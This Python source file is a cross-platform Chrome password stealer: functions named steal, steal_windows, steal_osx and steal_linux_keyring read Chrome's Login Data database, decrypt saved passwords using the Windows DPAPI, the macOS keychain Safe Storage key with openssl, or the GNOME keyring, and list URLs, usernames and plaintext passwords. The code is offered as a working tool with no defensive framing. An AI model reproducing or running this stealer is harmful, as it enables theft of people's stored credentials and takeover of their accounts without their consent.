# Common imports
import platform
import sqlite3
import os
# Windows imports
if platform.system() == "Windows":
	import win32crypt
	import sys
# OSX imports
elif platform.system() == 'Darwin':
	import binascii
	import subprocess
	import base64
	from hashlib import pbkdf2_hmac
# Linux imports
else:
	chrome_keyring = True
	from re import compile as rec
	try:
		import gnomekeyring as gk
	except ImportError:
		chrome_keyring = False

try:
	str = basestring
except:
	pass

def query_db(db_path):
	# Try to open the SQLite3 database
	try:
		conn = sqlite3.connect(db_path)
		cursor = conn.cursor()
	except:
		return ('[-] Couldn\'t open the database')
	# Execute the query
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
	except:
		return ('[-] Error getting the passwords from the database, Chrome is probably not closed')
	# Fetch all data
	return cursor.fetchall()

def steal():
	if platform.system() == "Windows":
		return steal_windows()
	elif platform.system()=='Darwin':
		return steal_osx()
	elif platform.system()=='Linux':
		return_list = list()
		# Basic return
		basic_return = steal_linux_basic()
		if isinstance(basic_return,str):
			return_list.append(basic_return)
		else:
			return_list = basic_return
		# Linux has 3 types of storage, basic,keyring and wallet, try everything then return
		if chrome_keyring == False:
			# Print a warning
			return_list.append("[-] Warning: gnomekeyring module not found.")
		else:
			# Get keyring
			keyring_list = steal_linux_keyring(rec(r"https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+"))
			if isinstance(keyring_list,str):
				return_list.append(keyring_list)
			else:
				for combo in keyring_list:
					return_list.append(combo)
		return return_list
	return("[-] "+platform.system()+" is not supported.")
# Decrypt Linux part one
def steal_linux_basic():
	# Recovered list
	recovered = list()
	# Get the passwords
	data = query_db(os.path.expanduser('~/.config/google-chrome/Default/Login Data'))
	# Are there any passwords?
	if not isinstance(data,list):
		return data
	if len(data) > 0:
		# Loop through the passwords
		for result in data:
			if len(result) != 3:
				continue
			# If the URL is blank,print it as (Unknown)
			if(len(result[0]) <= 0):
				result[0] = "(Unknown)"
			# If the username is blank,say so
			if(len(result[1]) <= 0):
				result[1] = "(Blank)"
			# If the password is blank,say so
			if(len(result[2]) <= 0):
				result[2] = "(Blank)"
			# Append to results
			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2].decode('utf-8')))
		if len(recovered) <= 0:
			return('[-] There are no saved passwords in the database')
		return recovered
	else:
		# There are no saved passwords
		return('[-] There are no saved passwords in the database')
# Decrypt Linux GNOME Keyring
def steal_linux_keyring(regex):
	# Recovered list
	recovered = list()
	# Traverse through all the keyrings
	for keyring in gk.list_keyring_names_sync():
		# Traverse the items
		for id in gk.list_item_ids_sync(keyring):
			# Extract info
			item = gk.item_get_info_sync(keyring, id)
			# Username
			url = item.get_display_name()
			username = gk.item_get_attributes_sync(keyring,id)
			username = username['username_value'] if username.has_key('username_value') else '(Blank)'
			password = item.get_secret()
			# Check if thing is an URL
			if regex.match(url) and all([username != '',password != '']):
				# Append to results
				recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=url,user=username,pass_=password))			
	if len(recovered) <= 0:
		return ("[-] There are no saved passwords in the keyring")
	else:
		return recovered
			
def steal_osx():
	# Recovered list
	recovered = list()
	# Get the passwords
	data = query_db(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
	# Get the encrpytion key from the keychain
	# Are there any passwords?
	if not isinstance(data,list):
		return data
	safe_storage_key = subprocess.Popen("security find-generic-password -wa "
					    "'Chrome'",
				            stdout=subprocess.PIPE,
					    stderr=subprocess.PIPE,
					    shell=True)
	stdout, stderr = safe_storage_key.communicate()
	safe_storage_key = stdout[:-1]
	# Catch keychain errors
	if stderr:
		return("[-]Chrome entry not found in keychain.")
	if not stdout:
		return("[-]You clicked deny.")
	# Are there any passwords?
	if len(data) > 0:
		# Loop through the passwords
		for result in data:
			#Setup the initialisation vector
			iv = ''.join(('20', ) * 16)
			# Setup the decryption key
			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
			hex_key = binascii.hexlify(key)
			# Decrpyt the password with the key
			hex_enc_password = base64.b64encode(result[2][3:])
			# Send any error messages to /dev/null to prevent screen bloating up
			# (any decryption errors will give a non-zero exit, causing exception)
			try:
				if hex_enc_password:
					# Decrpyt with OpenSSL
					decrpytCommand = "openssl enc -base64 -d -aes-128-cbc -iv '"+iv+"' -K "+hex_key.decode('utf-8')+" <<< "+hex_enc_password.decode('utf-8')+" 2>/dev/null"
					password = subprocess.check_output(decrpytCommand,
									   shell=True)
					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
			except subprocess.CalledProcessError:
				pass
		return recovered
	else:
		# There are no saved passwords
		return('[-] There are no saved passwords')

# Windows part
def steal_windows():
	# Recovered list
	recovered = list()
	# Get the passwords
	data = query_db(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
	# Are there any passwords?
	if not isinstance(data,list):
		return data
	# Check if there is any data
	if len(data) > 0:
		for result in data:
			# Decrypt the Password
			try:
				# The good/bad thing about the Chrome passwords is that they are easily decryptable
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except:
				# If it fails no biggie try another one
				pass
			# If the password is found
			if password:
				# If the URL is blank,print it as (Unknown)
				if(len(result[0]) <= 0):
					result[0] = "(Unknown)"
				# If the username is blank,say so
				if(len(result[1]) <= 0):
					result[1] = "(Blank)"
				# If the password is blank,say so
				if(len(password) <= 0):
					password = "(Blank)"
				# Append the result
				recovered.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
		return recovered
	else:
		# There are no saved passwords
		return('[-] There are no saved passwords')
